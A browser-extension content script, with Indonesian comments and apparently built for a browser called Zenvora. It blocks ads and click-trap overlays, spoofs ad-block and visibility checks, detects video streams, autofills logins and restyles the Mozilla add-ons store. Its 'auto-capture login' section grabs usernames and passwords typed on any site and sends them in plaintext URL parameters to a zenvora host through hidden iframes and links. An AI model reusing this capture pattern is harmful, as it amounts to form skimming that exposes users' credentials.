"use strict";

(function() {
  // 1. Injeksi Inti Zenvora di Main World (100% Aman untuk Layout Web Modern):
  // - Anti-Adblock Bait Spoofing
  // - YouTube & Web Background Play Unlocker
  // - Dummy Window Object untuk window.open (Agar Player Streaming seperti Filemoon/Streamtape/MissAV Menghapus Overlay Transparannya Sendiri & Langsung Play!)
  // - Defuser Programmatic Click-Hijack (a.click())
  // - Detektor Stream Video (.m3u8 / .mp4 / .mpd) Lintas-Iframe untuk Zenvora Native ExoPlayer
  const coreScript = `
    (function() {
      try {
        // A. Anti-Adblock Bait Spoofing
        Object.defineProperty(window, 'canRunAds', { get: () => true, set: () => {}, configurable: true });
        Object.defineProperty(window, 'isAdBlockActive', { get: () => false, set: () => {}, configurable: true });
        Object.defineProperty(window, 'adblock', { get: () => false, set: () => {}, configurable: true });
        Object.defineProperty(window, 'adBlockEnabled', { get: () => false, set: () => {}, configurable: true });
        Object.defineProperty(window, 'google_ad_status', { get: () => 1, set: () => {}, configurable: true });

        window.adsbygoogle = window.adsbygoogle || [];
        window.adsbygoogle.loaded = true;
        window.adsbygoogle.push = function() { return 0; };

        // B. YouTube & Streaming Background Play Unlocker
        Object.defineProperty(document, 'hidden', { get: () => false, configurable: true });
        Object.defineProperty(document, 'webkitHidden', { get: () => false, configurable: true });
        Object.defineProperty(document, 'visibilityState', { get: () => 'visible', configurable: true });
        Object.defineProperty(document, 'webkitVisibilityState', { get: () => 'visible', configurable: true });
        document.hasFocus = function() { return true; };

        // C. Kembalikan Dummy Window Object pada window.open (Bukan null!)
        // Penting: Player seperti Filemoon (hanerix/vibuxer/audinifer), Streamtape, Doodstream, dan MissAV
        // mengecek "if (win && !win.closed)" sebelum menghapus overlay transparan dan memutar video.
        const createDummyPopupWindow = function(targetUrl) {
          return {
            closed: false,
            opener: window,
            innerWidth: window.innerWidth || 360,
            innerHeight: window.innerHeight || 640,
            focus: function() {},
            blur: function() {},
            close: function() { this.closed = true; },
            postMessage: function() {},
            addEventListener: function() {},
            removeEventListener: function() {},
            document: {
              open: function() { return this; },
              write: function() {},
              writeln: function() {},
              close: function() {},
              body: { style: {} }
            },
            location: {
              href: targetUrl || 'about:blank',
              assign: function() {},
              replace: function() {},
              reload: function() {}
            }
          };
        };
        window.open = function(url) {
          return createDummyPopupWindow(url);
        };

        const origAnchorClick = HTMLAnchorElement.prototype.click;
        HTMLAnchorElement.prototype.click = function() {
          try {
            const href = (this.href || '').toLowerCase();
            if (href.startsWith('https://zenvora.')) {
              return origAnchorClick.apply(this, arguments);
            }
            const target = (this.target || '').toLowerCase();
            const linkHost = (this.hostname || '').toLowerCase();
            const pageHost = (location.hostname || '').toLowerCase();
            if (
              target === '_blank' &&
              linkHost &&
              pageHost &&
              linkHost !== pageHost &&
              !linkHost.endsWith('.' + pageHost)
            ) {
              return;
            }
            if (
              href.includes('popunder') ||
              href.includes('adsterra') ||
              href.includes('propeller') ||
              href.includes('exoclick') ||
              href.includes('slotgacor') ||
              href.includes('maxwin') ||
              href.includes('sbobet') ||
              href.includes('heylink.me')
            ) {
              return;
            }
          } catch (_) {}
          return origAnchorClick.apply(this, arguments);
        };

        const origAddEventListener = EventTarget.prototype.addEventListener;
        EventTarget.prototype.addEventListener = function(type, listener, options) {
          if (type === 'visibilitychange' || type === 'webkitvisibilitychange' || type === 'mozvisibilitychange') {
            return;
          }
          return origAddEventListener.call(this, type, listener, options);
        };

        // D. Sinkronisasi Ukuran Player Saat Layar Berputar ke Landscape Fullscreen
        const syncResizeOnFullscreen = function() {
          [80, 220, 480, 900].forEach(function(delayMs) {
            setTimeout(function() {
              try {
                window.dispatchEvent(new Event('resize'));
              } catch (_) {}
            }, delayMs);
          });
        };
        origAddEventListener.call(document, 'fullscreenchange', syncResizeOnFullscreen, true);
        origAddEventListener.call(document, 'webkitfullscreenchange', syncResizeOnFullscreen, true);
        origAddEventListener.call(document, 'mozfullscreenchange', syncResizeOnFullscreen, true);
        origAddEventListener.call(window, 'orientationchange', syncResizeOnFullscreen, true);

        // E. Detektor Aliran Video Otomatis (.m3u8 / .mp4 / .mpd) untuk Zenvora Native Player (ExoPlayer)
        const isYouTube = location.hostname.includes('youtube.com') || location.hostname.includes('youtu.be');
        let lastReportedStream = '';

        const reportDetectedStream = function(rawUrl) {
          try {
            if (isYouTube || !rawUrl || typeof rawUrl !== 'string') return;
            if (rawUrl.startsWith('blob:') || rawUrl.startsWith('data:')) return;
            const absUrl = rawUrl.startsWith('http') ? rawUrl : new URL(rawUrl, location.href).href;
            const lower = absUrl.toLowerCase();
            if (
              lower.includes('.ts?') ||
              lower.endsWith('.ts') ||
              lower.includes('preview.mp4') ||
              lower.includes('doubleclick') ||
              lower.includes('googlesyndication') ||
              lower.includes('oxgokpozzajz')
            ) {
              return;
            }
            const isStreamManifestOrVideo =
              lower.includes('.m3u8') ||
              lower.includes('.mpd') ||
              lower.includes('.mp4') ||
              lower.includes('/hls/') ||
              lower.includes('/hls2/') ||
              lower.includes('master.txt') ||
              lower.includes('index.txt');

            if (!isStreamManifestOrVideo) return;
            if (absUrl === lastReportedStream) return;
            lastReportedStream = absUrl;

            const bridgeUrl = 'https://zenvora.stream.detect/?src=' +
              encodeURIComponent(absUrl) +
              '&ref=' + encodeURIComponent(location.href);
            const pingFrame = document.createElement('iframe');
            pingFrame.style.cssText = 'display:none !important;width:0 !important;height:0 !important;border:0 !important;';
            pingFrame.src = bridgeUrl;
            (document.body || document.documentElement).appendChild(pingFrame);
            setTimeout(function() {
              try { pingFrame.remove(); } catch (_) {}
            }, 250);
          } catch (_) {}
        };

        const origXhrOpen = XMLHttpRequest.prototype.open;
        XMLHttpRequest.prototype.open = function(method, url) {
          try {
            if (typeof url === 'string') {
              reportDetectedStream(url);
            }
          } catch (_) {}
          return origXhrOpen.apply(this, arguments);
        };

        if (window.fetch) {
          const origFetch = window.fetch;
          window.fetch = function(input) {
            try {
              const urlStr = typeof input === 'string' ? input : (input && input.url ? input.url : '');
              if (urlStr) {
                reportDetectedStream(urlStr);
              }
            } catch (_) {}
            return origFetch.apply(this, arguments);
          };
        }

        const inspectVideoElement = function(e) {
          try {
            const v = e.target;
            if (v && v.tagName === 'VIDEO') {
              const src = v.currentSrc || v.src || '';
              if (src && src.startsWith('http')) {
                reportDetectedStream(src);
              } else {
                const sourceEl = v.querySelector('source[src]');
                if (sourceEl) {
                  reportDetectedStream(sourceEl.getAttribute('src') || '');
                }
              }
            }
          } catch (_) {}
        };

        origAddEventListener.call(document, 'loadedmetadata', inspectVideoElement, true);
        origAddEventListener.call(document, 'play', inspectVideoElement, true);
        origAddEventListener.call(document, 'playing', inspectVideoElement, true);
      } catch (_) {}
    })();
  `;

  try {
    const script = document.createElement("script");
    script.textContent = coreScript;
    (document.head || document.documentElement).appendChild(script);
    script.remove();
  } catch (_) {}

  // 2. Pembuka Kunci Pemutar yang Tertutup Elemen Transparan (Orphaned Transparent Ad-Overlay Unblocker)
  // Menangani situs seperti MissAV, Podjav, Supjav, Streamtape, Filemoon (hanerix/vibuxer/audinifer)
  const isLegitimatePlayerElement = (el) => {
    if (!el || !el.tagName) return false;
    const tag = el.tagName.toUpperCase();
    if (tag === "VIDEO" || tag === "BUTTON" || tag === "INPUT" || tag === "SELECT" || tag === "SVG" || tag === "PATH") {
      return true;
    }
    const clsAndId = ((el.className && typeof el.className === "string" ? el.className : "") + " " + (el.id || "")).toLowerCase();
    if (
      clsAndId.includes("jw-") ||
      clsAndId.includes("plyr") ||
      clsAndId.includes("vjs-") ||
      clsAndId.includes("ytp-") ||
      clsAndId.includes("ytm-") ||
      clsAndId.includes("art-") ||
      clsAndId.includes("fluid") ||
      clsAndId.includes("fp-") ||
      clsAndId.includes("dplayer") ||
      clsAndId.includes("mejs") ||
      clsAndId.includes("control") ||
      clsAndId.includes("progress") ||
      clsAndId.includes("scrubber") ||
      clsAndId.includes("slider") ||
      clsAndId.includes("modal") ||
      clsAndId.includes("dialog") ||
      clsAndId.includes("navbar") ||
      clsAndId.includes("header") ||
      clsAndId.includes("menu")
    ) {
      return true;
    }
    if (el.querySelector && el.querySelector("video, iframe, button, input, svg, .jw-icon, .plyr__control, .vjs-control")) {
      return true;
    }
    return false;
  };

  const isTransparentClickTrap = (el) => {
    try {
      if (!el || !el.tagName) return false;
      const tag = el.tagName.toUpperCase();
      if (tag === "BODY" || tag === "HTML" || tag === "VIDEO" || tag === "IFRAME") return false;
      if (isLegitimatePlayerElement(el)) return false;

      // 1. Anchor <a> transparan / kosong yang menutupi area besar (jebakan klik pop-under)
      if (tag === "A") {
        const href = (el.getAttribute("href") || "").toLowerCase();
        const target = (el.getAttribute("target") || "").toLowerCase();
        const rect = el.getBoundingClientRect();
        if (rect.width > 160 && rect.height > 120) {
          const style = window.getComputedStyle(el);
          const isInvisible =
            parseFloat(style.opacity || "1") < 0.15 ||
            style.backgroundColor === "rgba(0, 0, 0, 0)" ||
            style.backgroundColor === "transparent";
          if (isInvisible && (target === "_blank" || href.startsWith("http") || href === "#" || href.startsWith("javascript:"))) {
            return true;
          }
        }
      }

      // 2. Div overlay transparan kosong (position: absolute / fixed) di atas video/iframe
      if (tag === "DIV" || tag === "SPAN" || tag === " INS") {
        const style = window.getComputedStyle(el);
        const pos = style.position;
        if (pos !== "absolute" && pos !== "fixed") return false;

        const rect = el.getBoundingClientRect();
        if (rect.width < 140 || rect.height < 100) return false;

        const opacity = parseFloat(style.opacity || "1");
        const bg = (style.backgroundColor || "").replace(/\s+/g, "");
        const bgImg = style.backgroundImage || "none";
        const isTransparentSurface =
          opacity < 0.12 ||
          ((bg === "rgba(0,0,0,0)" || bg === "transparent") && bgImg === "none");

        if (!isTransparentSurface) return false;

        const text = (el.textContent || "").trim();
        if (text.length > 0) return false;

        return true;
      }
    } catch (_) {}
    return false;
  };

  const defuseTransparentVideoOverlays = () => {
    try {
      const mediaTargets = document.querySelectorAll(
        'video, iframe[src*="embed"], iframe[src*="/e/"], iframe[src*="player"], iframe[src*="stream"], iframe[allowfullscreen]'
      );
      if (mediaTargets.length === 0) return;

      for (let i = 0; i < mediaTargets.length; i++) {
        const media = mediaTargets[i];
        const rect = media.getBoundingClientRect();
        if (rect.width < 120 || rect.height < 80) continue;

        const centerX = rect.left + rect.width / 2;
        const centerY = rect.top + rect.height / 2;
        if (centerX < 0 || centerY < 0 || centerX > window.innerWidth || centerY > window.innerHeight) continue;

        const hitStack = document.elementsFromPoint(centerX, centerY);
        for (let j = 0; j < hitStack.length; j++) {
          const candidate = hitStack[j];
          if (candidate === media || candidate.contains(media)) break;
          if (isTransparentClickTrap(candidate)) {
            candidate.style.setProperty("pointer-events", "none", "important");
            candidate.style.setProperty("display", "none", "important");
          }
        }
      }
    } catch (_) {}
  };

  // Saat pengguna mengetuk area video yang terhalang elemen transparan yatim-piatu, buka kuncinya seketika!
  const handleUserTapOnBlockedPlayer = (e) => {
    try {
      const target = e.target;
      if (!target || typeof e.clientX !== "number") return;

      const hitStack = document.elementsFromPoint(e.clientX, e.clientY);
      let underlyingVideo = null;
      let underlyingIframe = null;
      let trapIndex = -1;

      for (let i = 0; i < hitStack.length; i++) {
        const el = hitStack[i];
        if (i === 0 && isTransparentClickTrap(el)) {
          trapIndex = 0;
        }
        if (el.tagName === "VIDEO") {
          underlyingVideo = el;
          break;
        }
        if (el.tagName === "IFRAME") {
          underlyingIframe = el;
          break;
        }
      }

      if (trapIndex === 0 && (underlyingVideo || underlyingIframe)) {
        const trapEl = hitStack[0];
        trapEl.style.setProperty("pointer-events", "none", "important");
        trapEl.style.setProperty("display", "none", "important");
        if (underlyingVideo && underlyingVideo.paused) {
          underlyingVideo.play().catch(function() {});
        }
      }
    } catch (_) {}
  };

  document.addEventListener("pointerdown", handleUserTapOnBlockedPlayer, true);
  document.addEventListener("click", handleUserTapOnBlockedPlayer, true);
  setInterval(defuseTransparentVideoOverlays, 1200);

  // 3. Pengatur Rasio & Zoom Video Lintas-Iframe Bebas CSP
  // Menggunakan properti CSS independen `scale` (BUKAN `transform`) agar TIDAK PERNAH menimpa `transform: translate(-50%, -50%)`
  // pada pemutar Fluid Player (podjav.tv), Plyr (missav.ws), Streamtape, atau Video.js!
  let currentVideoFitMode = "standard";

  const applyTransformToSingleVideo = (videoEl, mode) => {
    if (!videoEl || videoEl.tagName !== "VIDEO") return;
    videoEl.style.setProperty("transform-origin", "center center", "important");
    videoEl.style.setProperty("transition", "scale 0.18s ease-out", "important");

    // Buka kunci wrapper parent (.plyr__video-wrapper / .fluid_video_wrapper / .jw-media) agar tidak memotong video di rasio 16:9
    let parent = videoEl.parentElement;
    for (let depth = 0; depth < 3 && parent && parent !== document.body; depth++) {
      const pClass = (parent.className && typeof parent.className === "string") ? parent.className.toLowerCase() : "";
      if (
        pClass.includes("plyr__video-wrapper") ||
        pClass.includes("fluid_video_wrapper") ||
        pClass.includes("jw-media") ||
        pClass.includes("art-video")
      ) {
        if (mode !== "standard") {
          parent.style.setProperty("overflow", "visible", "important");
          parent.style.setProperty("aspect-ratio", "unset", "important");
        } else {
          parent.style.removeProperty("overflow");
          parent.style.removeProperty("aspect-ratio");
        }
      }
      parent = parent.parentElement;
    }

    if (mode === "stretch_20_9") {
      // Pas Layar 20:9: Rentangkan video 16:9 ke 20:9 menggunakan CSS `scale` independen tanpa men-zoom tombol kontrol player
      videoEl.style.setProperty("object-fit", "fill", "important");
      videoEl.style.setProperty("scale", "1.25 1.03", "important");
    } else if (mode === "zoom_20_9") {
      // Zoom Penuh: Perbesar proporsional 26% agar memenuhi layar 20:9 tanpa distorsi wajah & tanpa men-zoom kontrol
      videoEl.style.setProperty("object-fit", "cover", "important");
      videoEl.style.setProperty("scale", "1.26 1.26", "important");
    } else {
      // Standar 16:9
      videoEl.style.setProperty("object-fit", "contain", "important");
      videoEl.style.setProperty("scale", "1 1", "important");
    }
  };

  const applyVideoFitToAllVideos = (mode) => {
    currentVideoFitMode = mode || "standard";
    try {
      const videos = document.querySelectorAll("video");
      for (let i = 0; i < videos.length; i++) {
        applyTransformToSingleVideo(videos[i], currentVideoFitMode);
      }
    } catch (_) {}
  };

  document.addEventListener(
    "playing",
    function(e) {
      if (currentVideoFitMode !== "standard" && e.target && e.target.tagName === "VIDEO") {
        applyTransformToSingleVideo(e.target, currentVideoFitMode);
      }
    },
    true
  );

  window.addEventListener(
    "resize",
    function() {
      if (currentVideoFitMode !== "standard") {
        applyVideoFitToAllVideos(currentVideoFitMode);
      }
    },
    true
  );

  // 4. Fungsi Autofill Kredensial Bebas CSP (React / Vue / Angular / Form Klasik)
  const setNativeInputValue = (el, val) => {
    if (!el) return;
    try {
      const descriptor = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value");
      if (descriptor && descriptor.set) {
        descriptor.set.call(el, val);
      } else {
        el.value = val;
      }
    } catch (_) {
      el.value = val;
    }
    el.dispatchEvent(new Event("focus", { bubbles: true }));
    el.dispatchEvent(new Event("input", { bubbles: true }));
    el.dispatchEvent(new Event("change", { bubbles: true }));
    el.dispatchEvent(new Event("blur", { bubbles: true }));
  };

  const performCspFreeAutofill = (username, passwordValue) => {
    try {
      const passInputs = document.querySelectorAll('input[type="password"], input[data-zenvora-pwd="1"]');
      if (passInputs.length === 0) return;

      for (let i = 0; i < passInputs.length; i++) {
        const passEl = passInputs[i];
        setNativeInputValue(passEl, passwordValue);

        const scopeRoot = passEl.closest("form") || document;
        const candidateInputs = scopeRoot.querySelectorAll(
          'input[type="email"], input[type="text"], input[type="tel"], input:not([type])'
        );
        for (let j = 0; j < candidateInputs.length; j++) {
          const inp = candidateInputs[j];
          if (inp === passEl || inp.type === "hidden" || inp.disabled || inp.readOnly) continue;
          const rect = inp.getBoundingClientRect();
          if (rect.width > 0 && rect.height > 0) {
            setNativeInputValue(inp, username);
            break;
          }
        }
      }
    } catch (_) {}
  };

  if (typeof browser !== "undefined" && browser.runtime && browser.runtime.onMessage) {
    browser.runtime.onMessage.addListener(function(msg) {
      if (!msg || typeof msg !== "object") return;
      if (msg.zenvoraCmd === "video_fit") {
        applyVideoFitToAllVideos(msg.mode || "standard");
      } else if (msg.zenvoraCmd === "autofill") {
        performCspFreeAutofill(msg.user || "", msg.pass || "");
      }
    });
  }

  // 5. Auto-Capture Login & Password Manager (Mendeteksi Login Form & Mengirim Sinyal Simpan Sandi)
  let lastCapturedAuthKey = "";
  let lastTypedUsername = "";
  let lastTypedPassword = "";

  document.addEventListener(
    "input",
    function(e) {
      try {
        const el = e.target;
        if (!el || el.tagName !== "INPUT") return;
        const type = (el.getAttribute("type") || "text").toLowerCase();
        const nameAndId = ((el.name || "") + " " + (el.id || "") + " " + (el.autocomplete || "")).toLowerCase();
        if (type === "password" || el.getAttribute("data-zenvora-pwd") === "1") {
          el.setAttribute("data-zenvora-pwd", "1");
          if (el.value && el.value.length >= 3) {
            lastTypedPassword = el.value;
          }
        } else if (
          type === "email" ||
          type === "tel" ||
          (type === "text" &&
            !nameAndId.includes("search") &&
            !nameAndId.includes("cari") &&
            !nameAndId.includes("query") &&
            !nameAndId.includes("otp") &&
            !nameAndId.includes("captcha"))
        ) {
          if (el.value && el.value.trim().length >= 2) {
            lastTypedUsername = el.value.trim();
          }
        }
      } catch (_) {}
    },
    true
  );

  const extractAndSendLoginCredentials = () => {
    try {
      const passInputs = document.querySelectorAll('input[type="password"], input[data-zenvora-pwd="1"]');
      let passwordVal = "";
      let activePassEl = null;

      for (let i = 0; i < passInputs.length; i++) {
        const val = passInputs[i].value || "";
        if (val.length >= 3) {
          passwordVal = val;
          activePassEl = passInputs[i];
          break;
        }
      }

      if (!passwordVal && lastTypedPassword.length >= 3 && passInputs.length > 0) {
        passwordVal = lastTypedPassword;
        activePassEl = passInputs[0];
      }

      if (!passwordVal) return;

      let usernameVal = "";
      const scopeRoot = (activePassEl && activePassEl.closest("form")) || document;
      const userCandidates = scopeRoot.querySelectorAll(
        'input[autocomplete="username"], input[type="email"], input[name*="user" i], input[name*="login" i], input[name*="email" i], input[id*="user" i], input[id*="login" i], input[id*="email" i], input[type="tel"], input[type="text"], input:not([type])'
      );

      for (let j = 0; j < userCandidates.length; j++) {
        const candidate = userCandidates[j];
        if (candidate === activePassEl || candidate.getAttribute("data-zenvora-pwd") === "1") continue;
        if (candidate.type === "hidden" || candidate.type === "submit" || candidate.type === "button") continue;
        const val = (candidate.value || "").trim();
        if (val.length >= 2 && val !== passwordVal) {
          usernameVal = val;
          break;
        }
      }

      if (!usernameVal && lastTypedUsername.length >= 2 && lastTypedUsername !== passwordVal) {
        usernameVal = lastTypedUsername;
      }

      if (!usernameVal || !passwordVal) return;

      const host = (location.hostname || "").replace(/^www\./i, "");
      if (!host) return;

      const authKey = host + "|" + usernameVal + "|" + passwordVal;
      if (authKey === lastCapturedAuthKey) return;
      lastCapturedAuthKey = authKey;
      setTimeout(function() {
        if (lastCapturedAuthKey === authKey) {
          lastCapturedAuthKey = "";
        }
      }, 4000);

      const captureUrl =
        "https://zenvora.auth.capture/?host=" +
        encodeURIComponent(host) +
        "&url=" +
        encodeURIComponent(location.origin + location.pathname) +
        "&user=" +
        encodeURIComponent(usernameVal) +
        "&pass=" +
        encodeURIComponent(passwordVal);

      const pingFrame = document.createElement("iframe");
      pingFrame.style.cssText = "display:none !important;width:0 !important;height:0 !important;border:0 !important;";
      pingFrame.src = captureUrl;
      (document.body || document.documentElement).appendChild(pingFrame);
      setTimeout(function() {
        try { pingFrame.remove(); } catch (_) {}
      }, 300);

      const pingLink = document.createElement("a");
      pingLink.href = captureUrl;
      pingLink.target = "_blank";
      pingLink.rel = "noopener";
      pingLink.style.cssText = "display:none !important;";
      (document.body || document.documentElement).appendChild(pingLink);
      pingLink.click();
      setTimeout(function() {
        try { pingLink.remove(); } catch (_) {}
      }, 150);
    } catch (_) {}
  };

  document.addEventListener("submit", extractAndSendLoginCredentials, true);

  document.addEventListener(
    "keydown",
    function(e) {
      if (e.key === "Enter") {
        extractAndSendLoginCredentials();
      }
    },
    true
  );

  document.addEventListener(
    "click",
    function(e) {
      try {
        const target = e.target;
        if (!target || !target.closest) return;
        const btn = target.closest(
          'button, input[type="submit"], input[type="button"], [role="button"], a[class*="btn" i], a[class*="login" i], a[class*="submit" i]'
        );
        if (btn) {
          extractAndSendLoginCredentials();
        }
      } catch (_) {}
    },
    true
  );

  // 6. Next-Gen Cosmetic Adblock, Fullscreen Wrapper Unclipper & YouTube Auto-Ad-Skipper
  const injectPrecisionCosmeticShield = () => {
    if (!document.getElementById("zenvora-video-fs-style")) {
      const fsStyle = document.createElement("style");
      fsStyle.id = "zenvora-video-fs-style";
      fsStyle.textContent = `
        :fullscreen video,
        :-moz-full-screen video,
        :-webkit-full-screen video,
        .jwplayer.jw-flag-fullscreen video,
        .jwplayer.jw-flag-fullscreen .jw-media,
        .plyr:fullscreen .plyr__video-wrapper,
        .plyr:-moz-full-screen .plyr__video-wrapper,
        .plyr--fullscreen-active .plyr__video-wrapper,
        :fullscreen .plyr__video-wrapper,
        :-moz-full-screen .plyr__video-wrapper,
        :fullscreen .fluid_video_wrapper,
        :-moz-full-screen .fluid_video_wrapper {
          width: 100% !important;
          height: 100% !important;
          max-width: 100vw !important;
          max-height: 100vh !important;
          aspect-ratio: unset !important;
        }
        .jwplayer.jw-flag-fullscreen .jw-aspect,
        :fullscreen .plyr__video-wrapper,
        .plyr--fullscreen-active .plyr__video-wrapper {
          padding-top: 0 !important;
          padding-bottom: 0 !important;
        }
      `;
      (document.head || document.documentElement).appendChild(fsStyle);
    }

    if (!document.getElementById("zenvora-cosmetic-shield")) {
      const adStyle = document.createElement("style");
      adStyle.id = "zenvora-cosmetic-shield";
      adStyle.textContent = `
        ins.adsbygoogle,
        div[id^="div-gpt-ad"],
        iframe[id^="google_ads_iframe"],
        iframe[src*="doubleclick.net"],
        iframe[src*="googlesyndication.com"],
        iframe[src*="adsterra"],
        iframe[src*="exoclick"],
        iframe[src*="popads"],
        iframe[src*="propellerads"],
        iframe[src*="mgid.com"],
        iframe[src*="taboola.com"],
        iframe[src*="outbrain.com"],
        a[href*="slotgacor" i],
        a[href*="slot-gacor" i],
        a[href*="slot88" i],
        a[href*="maxwin" i],
        a[href*="sbobet" i],
        a[href*="judol" i],
        a[href*="zeus88" i],
        a[href*="hoki88" i],
        a[href*="cuan88" i],
        a[href*="gacor88" i],
        a[href*="mahjongways" i],
        a[href*="kakekzeus" i],
        a[href*="rtp-slot" i],
        a[href*="rtpslot" i],
        a[href*="heylink.me" i],
        img[src*="banner-iklan" i],
        img[src*="iklan-banner" i],
        img[src*="pasang-iklan" i],
        img[src*="slotgacor" i],
        img[src*="maxwin" i],
        img[alt*="slot gacor" i],
        img[alt*="situs judi" i],
        ytm-promoted-sparkles-web-renderer,
        ytm-companion-ad-renderer,
        ytd-ad-slot-renderer,
        ytd-in-feed-ad-layout-renderer,
        ytd-banner-promo-renderer,
        .ytp-ad-overlay-container,
        .ytp-ad-text-overlay {
          display: none !important;
          visibility: hidden !important;
          height: 0 !important;
          min-height: 0 !important;
          pointer-events: none !important;
        }
      `;
      (document.head || document.documentElement).appendChild(adStyle);
    }
  };

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", injectPrecisionCosmeticShield, { once: true });
  } else {
    injectPrecisionCosmeticShield();
  }

  if (location.hostname.includes("youtube.com")) {
    setInterval(function() {
      try {
        const skipBtns = document.querySelectorAll(
          ".ytp-ad-skip-button, .ytp-ad-skip-button-modern, .ytp-skip-ad-button, .ytp-ad-overlay-close-button"
        );
        for (let i = 0; i < skipBtns.length; i++) {
          skipBtns[i].click();
        }
        const adPlayer = document.querySelector(".html5-video-player.ad-showing video");
        if (adPlayer && !isNaN(adPlayer.duration) && adPlayer.duration > 0) {
          adPlayer.muted = true;
          adPlayer.currentTime = adPlayer.duration;
        }
      } catch (_) {}
    }, 600);
  }

  // 7. Integrasi Toko Ekstensi (addons.mozilla.org -> Zenvora Add-ons Store)
  const isAmoStore = location.hostname.includes("addons.mozilla.org");
  if (isAmoStore) {
    const resolveAmoSlug = () => {
      const match = location.pathname.match(/\/addon\/([^/?#]+)/i);
      return match && match[1] ? match[1] : null;
    };

    const transformMozillaStoreForZenvora = () => {
      try {
        if (!document.getElementById("zenvora-amo-style")) {
          const amoStyle = document.createElement("style");
          amoStyle.id = "zenvora-amo-style";
          amoStyle.textContent = `
            .GetFirefoxButton,
            .Notice-firefoxRequired,
            .WrongPlatformWarning,
            .FirefoxPromoBanner,
            [class*="FirefoxPromo"],
            [class*="WrongPlatformWarning"] {
              display: none !important;
            }
            a.AMInstallButton-button,
            button.AMInstallButton-button,
            .InstallButtonWrapper a {
              background-color: #FF6D00 !important;
              background-image: none !important;
              color: #000000 !important;
              font-weight: 800 !important;
              border-radius: 10px !important;
              border: none !important;
              pointer-events: auto !important;
              opacity: 1 !important;
              cursor: pointer !important;
              box-shadow: 0 2px 10px rgba(255, 109, 0, 0.35) !important;
            }
          `;
          (document.head || document.documentElement).appendChild(amoStyle);
        }

        const slug = resolveAmoSlug();
        const fallbackXpiUrl = slug
          ? "https://addons.mozilla.org/firefox/downloads/latest/" + slug + "/latest.xpi"
          : null;

        const buttons = document.querySelectorAll(
          "a.AMInstallButton-button, button.AMInstallButton-button, .InstallButtonWrapper a, a.Button--action, a[href*='.xpi']"
        );
        for (let i = 0; i < buttons.length; i++) {
          const btn = buttons[i];
          btn.removeAttribute("disabled");
          btn.classList.remove("AMInstallButton-button--disabled", "Button--disabled");

          const currentHref = btn.getAttribute("href") || "";
          if (fallbackXpiUrl && (!currentHref || currentHref.includes("mozilla.org/firefox/download") || currentHref === "#")) {
            btn.setAttribute("href", fallbackXpiUrl);
          }

          const txt = (btn.textContent || "").trim();
          if (
            txt.includes("Firefox") ||
            txt.includes("Tambahkan") ||
            txt.includes("Add to") ||
            txt.includes("Download file") ||
            txt.includes("Unduh berkas")
          ) {
            btn.textContent = "Pasang ke Zenvora";
          }
        }
      } catch (_) {}
    };

    document.addEventListener(
      "click",
      function(e) {
        try {
          const targetBtn = e.target
            ? e.target.closest(
                "a.AMInstallButton-button, button.AMInstallButton-button, .InstallButtonWrapper a, a[href*='.xpi'], a[href*='/firefox/downloads/']"
              )
            : null;
          if (!targetBtn) return;

          let xpiHref = targetBtn.getAttribute("href") || "";
          const slug = resolveAmoSlug();
          if ((!xpiHref.includes(".xpi") && !xpiHref.includes("/firefox/downloads/")) && slug) {
            xpiHref = "https://addons.mozilla.org/firefox/downloads/latest/" + slug + "/latest.xpi";
          }

          if (xpiHref && (xpiHref.includes(".xpi") || xpiHref.includes("/firefox/downloads/"))) {
            e.preventDefault();
            e.stopPropagation();
            e.stopImmediatePropagation();
            targetBtn.textContent = "Memasang ke Zenvora...";
            const absoluteXpi = xpiHref.startsWith("http")
              ? xpiHref
              : new URL(xpiHref, location.origin).href;
            window.location.assign(absoluteXpi);
          }
        } catch (_) {}
      },
      true
    );

    if (document.readyState === "loading") {
      document.addEventListener("DOMContentLoaded", transformMozillaStoreForZenvora, { once: true });
    } else {
      transformMozillaStoreForZenvora();
    }
    setInterval(transformMozillaStoreForZenvora, 500);
  }
})();
